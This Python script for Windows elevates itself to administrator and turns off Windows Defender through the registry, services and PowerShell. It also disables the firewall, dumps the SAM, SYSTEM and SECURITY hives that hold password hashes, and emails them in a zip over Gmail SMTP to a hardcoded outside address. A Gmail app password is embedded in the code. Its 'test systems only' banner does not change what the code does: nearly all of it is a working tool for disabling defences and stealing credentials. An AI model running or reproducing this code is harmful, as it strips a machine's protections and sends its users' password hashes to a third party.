import os
import sys
import subprocess
import ctypes
import time
import winreg
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import zipfile
import tempfile
import shutil

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    """Request administrator privileges with visible prompt"""
    if not is_admin():
        try:
            print("Requesting administrator privileges...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            sys.exit(0)
        except Exception as e:
            print(f"Failed to elevate privileges: {e}")
            input("Press Enter to exit...")
            sys.exit(1)

def run_command(cmd, description):
    """Run a command and return result with error handling"""
    try:
        print(f"⏳ {description}...")
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=30)
        if result.returncode == 0:
            print(f"✅ {description} - SUCCESS")
            return True
        else:
            print(f"❌ {description} - FAILED: {result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print(f"⏰ {description} - TIMEOUT")
        return False
    except Exception as e:
        print(f"❌ {description} - ERROR: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry"""
    print("\n" + "="*50)
    print("DISABLING WINDOWS DEFENDER VIA REGISTRY")
    print("="*50)
    
    registry_commands = [
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f', "Disable AntiSpyware"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f', "Disable Routine Actions"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f', "Disable Real-time Monitoring"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f', "Disable Behavior Monitoring"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f', "Disable IOAV Protection"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f', "Disable Block at First Sight"),
        ('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f', "Disable Sample Submission"),
    ]
    
    success_count = 0
    for cmd, desc in registry_commands:
        if run_command(cmd, desc):
            success_count += 1
    
    return success_count

def disable_defender_services():
    """Disable Windows Defender services"""
    print("\n" + "="*50)
    print("DISABLING WINDOWS DEFENDER SERVICES")
    print("="*50)
    
    services = [
        ("sc config WinDefend start= disabled", "Disable Windows Defender Service"),
        ("sc config WdNisSvc start= disabled", "Disable Network Inspection Service"),
        ("sc config Sense start= disabled", "Disable ATP Service"),
        ("sc config SecurityHealthService start= disabled", "Disable Security Health Service"),
        ("net stop WinDefend /y", "Stop Windows Defender Service"),
        ("net stop WdNisSvc /y", "Stop Network Inspection Service"),
        ("net stop Sense /y", "Stop ATP Service"),
        ("net stop SecurityHealthService /y", "Stop Security Health Service"),
    ]
    
    success_count = 0
    for cmd, desc in services:
        if run_command(cmd, desc):
            success_count += 1
    
    return success_count

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell"""
    print("\n" + "="*50)
    print("DISABLING WINDOWS DEFENDER VIA POWERSHELL")
    print("="*50)
    
    ps_commands = [
        ('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', "Disable Real-time Monitoring (PS)"),
        ('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', "Disable Behavior Monitoring (PS)"),
        ('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', "Disable Block at First Sight (PS)"),
        ('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', "Disable Sample Submission (PS)"),
        ('powershell -Command "Set-MpPreference -MAPSReporting 0"', "Disable Cloud Protection (PS)"),
        ('powershell -Command "Set-MpPreference -PUAProtection 0"', "Disable PUA Protection (PS)"),
    ]
    
    success_count = 0
    for cmd, desc in ps_commands:
        if run_command(cmd, desc):
            success_count += 1
    
    return success_count

def disable_firewall():
    """Disable Windows Firewall"""
    print("\n" + "="*50)
    print("DISABLING WINDOWS FIREWALL")
    print("="*50)
    
    firewall_commands = [
        ('netsh advfirewall set allprofiles state off', "Disable Firewall"),
        ('sc config MpsSvc start= disabled', "Disable Firewall Service"),
        ('net stop MpsSvc /y', "Stop Firewall Service"),
    ]
    
    success_count = 0
    for cmd, desc in firewall_commands:
        if run_command(cmd, desc):
            success_count += 1
    
    return success_count

def extract_sam_files():
    """Extract SAM, SYSTEM, and SECURITY registry files"""
    print("\n" + "="*50)
    print("EXTRACTING SAM FILES")
    print("="*50)
    
    sam_files = {
        'hklm\\sam': 'C:\\Windows\\Temp\\sam.save',
        'hklm\\system': 'C:\\Windows\\Temp\\system.save', 
        'hklm\\security': 'C:\\Windows\\Temp\\security.save'
    }
    
    success_count = 0
    for reg_key, output_path in sam_files.items():
        cmd = f'reg save {reg_key} {output_path} /y'
        if run_command(cmd, f"Extract {reg_key}"):
            success_count += 1
            # Verify file was created
            if os.path.exists(output_path):
                print(f"✅ Verified: {output_path} created successfully")
            else:
                print(f"❌ File not found: {output_path}")
    
    return success_count, sam_files

def create_zip_archive(files_dict, zip_path):
    """Create a zip archive of the extracted files"""
    try:
        print(f"📦 Creating zip archive: {zip_path}")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for reg_key, file_path in files_dict.items():
                if os.path.exists(file_path):
                    zipf.write(file_path, os.path.basename(file_path))
                    print(f"✅ Added to zip: {os.path.basename(file_path)}")
                else:
                    print(f"❌ File not found for zipping: {file_path}")
        return True
    except Exception as e:
        print(f"❌ Failed to create zip: {e}")
        return False

def send_to_gmail(zip_path):
    """Send the zip file to Gmail"""
    print("\n" + "="*50)
    print("SENDING FILES TO GMAIL")
    print("="*50)
    
    # Gmail configuration
    sender_email = "yourbot.email.sender@gmail.com"  # Replace with your sending Gmail
    receiver_email = "github0987@gmail.com"
    password = "gwhl efna quvk qhqj"  # Use App Password, not regular password
    
    # Email content
    subject = "SAM Files Extraction"
    body = f"""
    SAM, SYSTEM, and SECURITY files extracted from:
    Computer: {os.environ['COMPUTERNAME']}
    User: {os.environ['USERNAME']}
    Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
    
    Files included:
    - sam.save
    - system.save
    - security.save
    """
    
    try:
        # Create message
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        message.attach(MIMEText(body, "plain"))
        
        # Attach zip file
        with open(zip_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename=sam_files_{time.strftime('%Y%m%d_%H%M%S')}.zip",
        )
        message.attach(part)
        
        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        
        print("✅ Email sent successfully!")
        return True
        
    except Exception as e:
        print(f"❌ Failed to send email: {e}")
        return False

def cleanup_files(files_dict, zip_path):
    """Clean up extracted files and zip"""
    print("\n" + "="*50)
    print("CLEANING UP FILES")
    print("="*50)
    
    try:
        # Delete individual files
        for file_path in files_dict.values():
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"✅ Deleted: {file_path}")
        
        # Delete zip file
        if os.path.exists(zip_path):
            os.remove(zip_path)
            print(f"✅ Deleted: {zip_path}")
            
    except Exception as e:
        print(f"❌ Cleanup error: {e}")

def countdown_timer(minutes):
    """Display a countdown timer"""
    print(f"\n⏰ PROTECTIONS DISABLED FOR {minutes} MINUTES")
    print("="*50)
    
    seconds = minutes * 60
    for remaining in range(seconds, 0, -1):
        mins, secs = divmod(remaining, 60)
        time_str = f"{mins:02d}:{secs:02d}"
        print(f"Time remaining: {time_str}", end='\r')
        time.sleep(1)
    
    print("\n\n⚠️  TIME'S UP! Your system is now vulnerable!")
    print("Please re-enable Windows Defender protections manually.")

def main():
    """Main function"""
    print("🛡️  WINDOWS DEFENDER DISABLE & SAM EXTRACTION SCRIPT")
    print("="*60)
    print("⚠️  WARNING: This will disable critical security protections!")
    print("⚠️  Use only on test systems you own!")
    print("="*60)
    
    # Check admin privileges
    if not is_admin():
        print("❌ Administrator privileges required!")
        elevate_privileges()
        return
    
    print("✅ Running with administrator privileges")
    
    # Execute all disable functions
    total_success = 0
    total_commands = 0
    
    total_success += disable_defender_registry()
    total_commands += 7
    
    total_success += disable_defender_services()
    total_commands += 8
    
    total_success += disable_defender_powershell()
    total_commands += 6
    
    total_success += disable_firewall()
    total_commands += 3
    
    # Extract SAM files
    sam_success, sam_files = extract_sam_files()
    total_success += sam_success
    total_commands += 3
    
    # Create zip file
    zip_path = "C:\\Windows\\Temp\\sam_files.zip"
    zip_created = create_zip_archive(sam_files, zip_path)
    
    # Send to Gmail if zip was created
    email_sent = False
    if zip_created and os.path.exists(zip_path):
        print("\n📧 Attempting to send files to Gmail...")
        email_sent = send_to_gmail(zip_path)
    else:
        print("❌ Zip file not created, skipping email")
    
    # Show summary
    print("\n" + "="*60)
    print("FINAL SUMMARY")
    print("="*60)
    print(f"Commands executed: {total_success}/{total_commands} successful")
    print(f"SAM files extracted: {sam_success}/3")
    print(f"Zip file created: {zip_created}")
    print(f"Email sent: {email_sent}")
    
    if total_success > total_commands * 0.6:  # 60% success rate
        print("✅ Most operations completed successfully!")
        
        # Start timer if email was sent
        if email_sent:
            print("\n⏰ Starting 30-minute timer...")
            countdown_timer(30)
    else:
        print("❌ Many operations failed. Some features may still be active.")
    
    # Cleanup files
    cleanup_files(sam_files, zip_path)
    
    # Keep window open
    print("\n" + "="*60)
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
